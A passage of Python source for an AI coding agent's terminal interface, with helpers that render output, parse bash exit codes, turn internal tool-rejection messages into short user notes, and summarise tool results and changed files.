            sys.stdout.write(f"  {line}\n")
        sys.stdout.flush()
        return
    c = Console(width=width, soft_wrap=True)
    has_md = any(m in text for m in ("```", "###", "**", "- ", "1. ", "`"))
    if has_md:
        c.print(Padding(Markdown(text), (0, 2, 0, 2)))
    else:
        c.print(Padding(text, (0, 2, 0, 2)))

def _split_exit_code(result: str) -> tuple[int | None, str]:
    """Split a bash result into (exit_code, body).

    bash.py prepends `[exit code N]\\n` to a failed command's output as a
    model-facing failure marker. Return the parsed code and the remaining body,
    or (None, result) when the marker is absent (command succeeded).
    """
    s = result.lstrip()
    if s.startswith("[exit code "):
        end = s.find("]")
        if end != -1:
            try:
                code = int(s[len("[exit code "):end].strip())
            except ValueError:
                return None, result
            body = s[end + 1:]
            return code, body[1:] if body.startswith("\n") else body
    return None, result


def _redirect_note(result: str) -> str:
    """Turn an internal `REJECTED …` string into a short user-facing note.

    The full REJECTED payload (routing hints, "Suggested tool call: …",
    hard-stop instructions) is for the model's recovery, not the user. Two
    cases: a routing redirect ("use X instead") → "→ used X instead"; anything
    else (repeat/hard-stop/unsafe/oversize block) → a neutral "→ skipped …"
    note. Never show the raw protocol text.
    """
    import re
    m = re.search(r"\buse\s+([a-z_]+)\s+instead", result)
    if m:
        return f"→ used {m.group(1)} instead"
    low = result.lower()
    if "hard stop" in low or "already failed" in low or "already ran" in low or "rewritten" in low:
        return "→ skipped (repeating a call that won't help)"
    if "safety ceiling" in low or "over the" in low:
        return "→ skipped (too large — splitting instead)"
    if "defer" in low or "blocked" in low or "live server" in low:
        return "→ skipped that step"
    return "→ adjusted approach"


def _brief_result(tool_name: str, result: str) -> str:
    """Short summary of a tool result for terminal display."""
    lines = result.strip().splitlines()
    # Dedup short-circuits across ALL deduped tools (read_file,
    # list_files, glob, grep) return a tiny "[DEDUP …]" stub. Counting
    # lines / matches on the stub gives "1 lines" / "1 matches" in the
    # chat log — looks like a 1-line file or 1 match, which confuses
    # the user. Surface the dedup honestly first so the user can see
    # the cache behaviour, then fall through to per-tool formatting.
    s = result.strip()
    if s.startswith("[DEDUP"):
        return "already done — using cached result"
    if s.startswith("[FILE UNCHANGED"):
        return "unchanged — see earlier read"
    # Internal tool-routing/hard-stop correction. This is a signal FOR THE
    # MODEL, not the user — render a short neutral note, never the raw
    # "REJECTED: …" / "REJECTED — HARD STOP: …" protocol text (both forms).
    if s.startswith("REJECTED"):
        return _redirect_note(s)
    if tool_name == "read_file":
        return f"{len(lines)} lines"
    if tool_name == "write_file":
        return result.strip()[:80] if result.strip() else "written"
    if tool_name == "edit_file":
        return result.strip()[:80] if result.strip() else "edited"
    if tool_name == "bash":
        # `[exit code N]` is a model-facing marker prepended to the output so the
        # model knows the command failed. Don't show that raw token to the user:
        # strip it, and render a clean "failed (exit N)" plus any real output.
        exit_code, body = _split_exit_code(result)
        body_lines = body.strip().splitlines()
        if exit_code is not None:
            head = body_lines[0][:80] if body_lines and body_lines[0].strip() else ""
            tail = f"  …({len(body_lines)} lines)" if len(body_lines) > 1 else ""
            return f"failed (exit {exit_code}){(': ' + head) if head else ''}{tail}"
        if not body.strip():
            return "done (no output)"
        if len(body_lines) <= 3:
            return "\n".join(body_lines)[:200]
        return f"{body_lines[0][:80]}  …({len(body_lines)} lines)"
    if tool_name == "grep":
        return f"{len(lines)} matches" if lines and lines[0] else "no matches"
    if tool_name in ("glob", "list_files"):
        return f"{len(lines)} files"
    if tool_name == "web_search":
        return f"{len(lines) // 3} results" if lines else "no results"
    return result[:80] if result else "done"

def _grounded_file_summary(repo: Path, changed_files: list[str]) -> str:
    """Build a deterministic summary from files that actually exist on disk."""
    existing: list[str] = []
    for rel in changed_files:
        path = repo / rel
        if path.exists() and path.is_file():
            existing.append(rel)

    if not existing:
        return ""

    lines = ["Updated files:"]
    for rel in existing:
        try:
            line_count = len((repo / rel).read_text(errors="replace").splitlines())
            lines.append(f"- `{rel}` ({line_count} lines)")
        except Exception:
            lines.append(f"- `{rel}`")
    return "\n".join(lines)

def _tool_stage_label(tool_name: str, args: dict) -> str:
    """Human-readable stage label for the indicator."""
    if tool_name == "bash":
        cmd = args.get("command", "")
        if "pip " in cmd:
            return "installing packages"
        if "npm " in cmd:
            return "installing packages"
        if "git " in cmd:
            return "git operation"
        if "python " in cmd or "pytest" in cmd:
            return "running code"
        return "running command"
    if tool_name == "write_file":
        return f"writing {Path(args.get('path', 'file')).name}"
    if tool_name == "edit_file":
        return f"editing {Path(args.get('path', 'file')).name}"
    if tool_name == "read_file":
        return f"reading {Path(args.get('path', 'file')).name}"
    if tool_name == "grep":
        return "searching code"
    if tool_name == "glob":
        return "finding files"
    if tool_name == "web_search":
        return "searching web"
    return tool_name
